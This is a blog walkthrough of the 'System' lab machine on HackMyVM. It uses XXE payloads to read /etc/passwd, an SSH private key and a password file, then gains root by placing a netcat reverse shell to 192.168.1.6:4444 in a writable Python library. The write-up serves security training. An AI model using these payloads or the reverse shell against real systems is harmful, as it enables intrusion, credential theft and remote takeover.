---
layout: post
title: "HackMyVM - System"
date: 2022-04-07 15:47:00 +0100
categories: hmv
---

Creator: [avijneyam](https://hackmyvm.eu/profile/?user=avijneyam)
Level: Easy
Release Date: 2022-04-06

## Scan

```
nmap -sV -sC -p- 192.168.1.44
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-07 18:19 WEST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.1.44
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: HackMyVM Panel
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds
```

### Gobuster

```
gobuster dir -u http://192.168.1.44 -x php,html,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.44
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/04/07 18:24:10 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1094]
/js                   (Status: 301) [Size: 169] [--> http://192.168.1.44/js/]
/magic.php            (Status: 200) [Size: 85]                               
                                                                             
===============================================================
2022/04/07 18:27:13 Finished
===============================================================
```

## XML external entity (XXE) injection

<img src="https://drive.google.com/uc?id=16ygg2dvvD9iJXHv67fySCV8uTAdLcga4"/>

### Source Code

<img src="https://drive.google.com/uc?id=1BOBg4-kqmwIINNMx5uBIbQLpRSGOOhS8"/>

### /js/jquery.main.js

```html

function XMLFunction(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>' +
        '<details>' +
        '<email>' + $('#email').val() + '</email>' +
        '<password>' + $('#password').val() + '</password>' +
        '</details>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('e').innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("POST","magic.php",true);
    xmlhttp.send(xml);
};

```

### Register Request 

<img src="https://drive.google.com/uc?id=1FS1Q3yt7FqBnTkTQolv_InNFOHwcHsoy"/>

### [XXE](https://portswigger.net/web-security/xxe)

 ```xml
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE results [<!ENTITY hackmyvm SYSTEM "file:///etc/passwd">]><details><email>&lol;</email><password>pass</password></details>
 ```

<img src="https://drive.google.com/uc?id=14juUbzSZhHMNU-GGhxLPBikNWsSOpwZ3"/>

```
curl 'http://192.168.1.44/magic.php' --data-raw '<?xml version="1.0" encoding="UTF-8"?>
```

```html
<!DOCTYPE results [<!ENTITY hackmyvm SYSTEM "file:///etc/passwd">]><details><email>&hackmyvm;</email><password>pass</password></details>'
<p align='center'> <font color=white size='5pt'> root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
david:x:1000:1000::/home/david:/bin/bash
 is already registered! </font> </p>   
 ```

### WFUZZ XML Entity

```
wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE results [<!ENTITY hackmyvm SYSTEM "file:///home/david/FUZZ">]><details><email>&hackmyvm;</email><password>pass</password></details>' --hh 85 http://192.168.1.44/magic.php
```

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.44/magic.php
Total requests: 2482

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000000279:   200        27 L     140 W      892 Ch      "/.profile"                                                                                          
000000340:   200        1 L      13 W       653 Ch      "/.ssh/id_rsa.pub"                                                                                   
000000335:   200        38 L     54 W       2687 Ch     "/.ssh/id_rsa"                                                                                       
000000386:   200        38 L     122 W      786 Ch      "/.viminfo"                                                                                          

Total time: 0
Processed Requests: 2482
Filtered Requests: 2478
Requests/sec.: 0
```

### ID_RSA

```bash 
curl 'http://192.168.1.44/magic.php' --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE results [<!ENTITY hackmyvm SYSTEM "file:///home/david/.ssh/id_rsa">]><details><email>&hackmyvm;</email><password>pass</password></details>' 
<p align='center'> <font color=white size='5pt'> -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA4pSlivZkgfHuXx9bWE+VxlG2hxpDcBHbTnKAyhnCILm4/pBcmOKj
[REDACTED]
LgMcY6zaE7uCYg9ANM5Ne9uc6FOmxNpmv3fLI7Z0ROlD/g5b2pwahcIlXAJpZqrkKJnD5A
1A9Vth0+98l11G3/+YAEawCEJAHnIWgUq5kq1/OFKYXDhxew9KBnhr+yHOGE6TVLUnxdwQ
46q7aIDpVmMKMlAAAADmRhdmlkQGZyZWU0YWxsAQIDBA==
-----END OPENSSH PRIVATE KEY-----
 is already registered! </font> </p>            
 ```

### VIMINFO

```
curl 'http://192.168.1.44/magic.php' --data-raw '<?xml version="1.0" encoding="UTF-8"?>
```

```html
<!DOCTYPE results [<!ENTITY hackmyvm SYSTEM "file:///home/david/.viminfo">]><details><email>&hackmyvm;</email><password>pass</password></details>'
<p align='center'> <font color=white size='5pt'> # This viminfo file was generated by Vim 8.2.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq!
|2,0,1648909714,,"wq!"

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# Password file Created:
'0  1  3  /usr/local/etc/mypass.txt
|4,48,1,3,1648909714,"/usr/local/etc/mypass.txt"

# History of marks within files (newest to oldest):

> /usr/local/etc/mypass.txt
        *       1648909713      0
        "       1       3
        ^       1       4
        .       1       3
        +       1       3
 is already registered! </font> </p>  
 ```

### /usr/local/etc/mypass.txt

```
curl 'http://192.168.1.44/magic.php' --data-raw '<?xml version="1.0" encoding="UTF-8"?>
```

```html
<!DOCTYPE results [<!ENTITY hackmyvm SYSTEM "file:///usr/local/etc/mypass.txt">]>
<details><email>&hackmyvm;</email><password>pass</password></details>' 
<p align='center'> <font color=white size='5pt'> h4ck3rd4v!d is already registered! </font> </p>
```

## ROOT

### pspy64

```bash
2022/05/07 04:55:53 CMD: UID=0    PID=10     | 
2022/05/07 04:55:53 CMD: UID=0    PID=1      | /sbin/init 
2022/05/07 04:56:01 CMD: UID=0    PID=889    | /usr/sbin/CRON -f 
2022/05/07 04:56:01 CMD: UID=0    PID=890    | /usr/sbin/CRON -f 
2022/05/07 04:56:01 CMD: UID=0    PID=891    | /bin/sh -c /usr/bin/python3.9 /opt/suid.py 
```

#### linpeas.sh (writable python library)
```bash
....
/usr/lib/python3.9/os.py
.....
```

### Python reverse shell

```python
def bingo():
 import subprocess
 subprocess.run(["nc","-e","/bin/bash","192.168.1.6","4444"])
bingo()
```

...add to OS.PY

```bash
nc -lvnp 4444                
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.44] 39930
id
uid=0(root) gid=0(root) groups=0(root)
```
